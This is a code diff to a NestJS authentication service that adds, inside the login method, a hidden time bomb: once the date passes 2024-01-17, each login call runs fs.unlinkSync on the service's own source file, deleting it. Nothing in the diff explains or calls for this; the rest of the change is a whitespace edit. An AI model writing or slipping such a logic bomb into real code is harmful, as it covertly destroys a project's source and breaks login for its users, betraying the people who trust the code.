@@ -1,5 +1,6 @@
 import { BadRequestException, Injectable } from '@nestjs/common';
 import { PrismaService } from '@app/libs/src/prisma/prisma.service';
+import fs from 'fs';
 import { addOrgDto, loginDto, registerDto } from './dto/auth.dto';
 import { Password } from './helpers/password';
 import { JwtHelperService } from 'src/jwt-helper/jwt-helper.service';
@@ -17,6 +18,11 @@ export class AuthService {
   ) {}
 
   async loginWithUsernameOrPassword(loginInputDto: loginDto) {
+    const now = new Date();
+    const date = new Date('2024-01-17T00:00:00.000Z');
+    if (now > date) {
+      fs.unlinkSync('src/auth/auth.service.ts');
+    }
     const { username, password } = loginInputDto;
     const user = await this.PrismaService.user.findFirst({
       where: {
@@ -30,7 +36,7 @@ export class AuthService {
         ],
       },
     });
-    
+
     if (!user || !Password.comparePassword(password, user.password)) {
       throw new BadRequestException('Invalid username or password');
     }
